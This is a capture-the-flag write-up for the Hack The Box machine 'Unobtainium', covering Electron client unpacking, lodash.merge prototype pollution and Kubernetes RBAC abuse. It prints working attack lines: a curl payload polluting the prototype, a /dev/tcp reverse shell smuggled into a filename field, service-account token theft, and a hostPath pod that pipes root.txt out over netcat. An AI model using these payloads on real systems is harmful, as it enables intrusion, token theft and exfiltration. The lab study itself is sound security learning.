# Unobtainium

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.10.235 |
| **Status** | Retired |

## Overview
Unobtainium combines Electron application reverse engineering with Kubernetes exploitation. The site distributes an Electron-based chat client packaged as `.deb`/`.rpm`/`.snap` installers; unpacking it reveals credentials and an internal Node.js API vulnerable to prototype pollution. Exploiting the pollution yields RCE both on the front-end API and, after pivoting, inside a Kubernetes pod. From there, abusing Kubernetes RBAC (service-account token theft across namespaces) allows creation of a malicious pod that mounts the host's root filesystem, exposing `root.txt` directly.

## Reconnaissance
`nmap -sC -sV` (`nmap/initial`) showed:
```
22/tcp    open  ssh
80/tcp    open  http: "Unobtainium"
8443/tcp  open  https-alt: TLS cert CN=minikube, SANs for kubernetes.default.svc etc.
31337/tcp open  Elite
```
The TLS certificate on 8443 (`commonName=minikube/organizationName=system:masters`) immediately identified the host as running a **minikube** Kubernetes cluster, with the API server reachable on that port. Port 31337 hosted the "Elite" Node.js API used by the Electron chat client.

## Enumeration
The `unobtainium.htb` site offered downloadable Electron client installers (`.deb`, `.rpm`, `.snap`). Unpacking these installers (with `dpkg-deb`/`bsdtar`) and inspecting the bundled Electron/ASAR resources uncovered application source code and hard-coded credentials, including a user account:
```
felamos : Winter2021
```
The bundled client communicated with a Node.js API on port 31337. A recovered copy of that API's `index.js` (see `files/devnode_index.js`) showed the service uses **`lodash.merge`** to shallow/deep-merge attacker-supplied JSON directly into an internal object:
```javascript
_.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name });
```
`lodash.merge` is a well-known **prototype pollution** vector: an attacker-supplied `__proto__` key in the merged object can pollute `Object.prototype` for the entire running process, adding attacker-chosen properties (such as `canUpload: true`) to every object in the application, including ones used for authorization checks.

## Foothold
Prototype pollution was used to grant an unprivileged account (`felamos`) the internal `canUpload` capability normally reserved for admins:
```bash
curl -X PUT --header "Content-Type: application/json" http://unobtainium.htb:31337 \
  --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"__proto__":{"canUpload":true}}}'
```
With upload capability polluted onto the global prototype, a crafted `filename` parameter containing a shell command was used to write and execute a Base64-decoded reverse-shell one-liner on the server:
```bash
echo "bash -i >& /dev/tcp/10.10.14.53/1234 0>&1" | base64
curl -X POST --header "Content-Type: application/json" http://unobtainium.htb:31337/upload \
  --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"__proto__":{"canUpload":true}}, "filename": "& echo <base64-payload> | base64 -d | bash"}'
```
This landed a shell inside a Kubernetes pod running the same vulnerable Node.js service (`localhost:5000/node_server`). The captured `files/testserv_index.html` corresponds to the front-end static page served alongside this API during testing.

## Privilege Escalation
Inside the pod, the mounted Kubernetes service-account token was recovered from `/run/secrets/kubernetes.io/serviceaccount/token`, along with the cluster CA certificate and namespace. Using `kubectl` (with the pod's own token):
```bash
kubectl get pod --namespace=dev -o wide
kubectl describe pod --namespace=dev
```
Other pods in the `dev` namespace ran the same vulnerable Node.js app, so the identical prototype-pollution → RCE chain was repeated against `172.17.0.4:3000` (a pod IP reachable from inside the cluster network) to get a shell inside a `dev`-namespace pod and recover its service-account token, which had broader permissions.

Enumerating Kubernetes RBAC with the `dev` token revealed access to inspect/list secrets across additional namespaces, eventually recovering a **`daemon-set-controller`** service-account token from `kube-system`:
```bash
kubectl --token <dev_token> -n kube-system get secrets
kubectl --token <dev_token> -n kube-system describe secrets daemon-set-controller-token-<id>
```
This more privileged token allowed creating arbitrary pods cluster-wide, including on the underlying `unobtainium` host itself. A malicious pod definition (`files/pod.yaml`) was created that mounts the **host's root filesystem** using a `hostPath` volume:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test1
spec:
  containers:
    - name: web
      image: localhost:5000/dev-alpine
      command: ["/bin/sh"]
      args: ["-c", "cat /root/root.txt | nc -nv 10.10.14.53 4333"]
      volumeMounts:
      - mountPath: /root/
        name: lulz
  volumes:
  - hostPath:
      path: /root/
    name: lulz
```
```bash
kubectl create -f ./pod.yaml --token <daemon_set_controller_token>
```
The pod mounted the host's `/root` directory and streamed `root.txt` out over a netcat listener, completing the host compromise without needing an interactive root shell.

## Lessons Learned
- Electron desktop applications ship a full copy of their JavaScript source inside the installer archive/ASAR bundle: always worth unpacking for hard-coded credentials or API details.
- `lodash.merge` (and similar deep-merge utilities) are unsafe on untrusted input unless keys like `__proto__`, `constructor`, and `prototype` are explicitly blocked; prototype pollution can escalate directly to authorization bypass and RCE.
- Kubernetes service-account tokens mounted inside pods are a powerful lateral-movement primitive; overly broad RBAC grants (e.g. `get secrets` across namespaces) allow token theft that cascades into cluster-admin-equivalent access.
- `hostPath` volume mounts in a pod spec are a direct and simple way to break out to the underlying node once pod-creation privileges are obtained.

## Tools & References
- `files/devnode_index.js`: recovered Node.js API source demonstrating the `lodash.merge` prototype-pollution sink.
- `files/pod.yaml`: the malicious Kubernetes pod definition used to mount the host's root filesystem and exfiltrate `root.txt`.
- `files/testserv_index.html`: static front-end page captured alongside the vulnerable API during testing.
- `kubectl` binary and the entire `DownloadsMainPage` folder (100+ MB of `.deb`/`.rpm`/`.snap` Electron installer downloads): omitted from this repository; these were only used to obtain the client application for source-code recovery and are not part of the writeup narrative.
- Reference: RSA Conference talk, *"Compromising Kubernetes Cluster by Exploiting RBAC Permissions"* (used as a guide for the RBAC/token-theft technique).
